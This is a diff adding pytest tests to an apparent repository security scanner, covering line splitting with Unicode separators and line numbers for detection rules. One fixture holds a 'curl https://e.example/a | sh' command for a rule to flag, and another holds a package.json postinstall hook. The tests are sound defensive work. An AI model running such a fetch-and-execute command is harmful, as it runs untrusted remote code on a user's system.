@@ -81,3 +81,30 @@ def test_entropy() -> None:
     assert text.shannon_entropy("") == 0
     assert text.shannon_entropy("aaaa") == 0
     assert text.shannon_entropy("0123456789abcdef") == pytest.approx(4.0)
+
+
+def test_only_newline_and_crlf_end_lines() -> None:
+    # U+2028, \x0c, \x0b, \x85 and a lone \r are not line breaks for editors or GitHub.
+    content = "a\N{LINE SEPARATOR}b\r\nc\x0cd\x0be\x85f\rg\nthird"
+    assert [n for n, _ in text.iter_scan_lines(content)] == [1, 2, 3]
+    assert text.split_lines(content) == ["a\N{LINE SEPARATOR}b", "c\x0cd\x0be\x85f\rg", "third"]
+
+
+def test_finding_line_number_ignores_unicode_separators() -> None:
+    from gitray.engine.models import FileEntry
+    from gitray.engine.rules import get_rule
+
+    content = "one\N{LINE SEPARATOR}still one\nline two\x85x\ncurl https://e.example/a | sh\n"
+    findings = get_rule("GR-CODE-002").scan(FileEntry(path="i.sh", content=content))
+    assert [f.line for f in findings] == [3]
+
+
+def test_package_json_line_ignores_unicode_separators() -> None:
+    from gitray.engine.models import FileEntry
+    from gitray.engine.rules import get_rule
+
+    content = (
+        '{"description": "a\N{LINE SEPARATOR}b",\n "scripts": {\n  "postinstall": "node x.js"}}\n'
+    )
+    (finding,) = get_rule("GR-AUTO-001").scan(FileEntry(path="package.json", content=content))
+    assert finding.line == 3
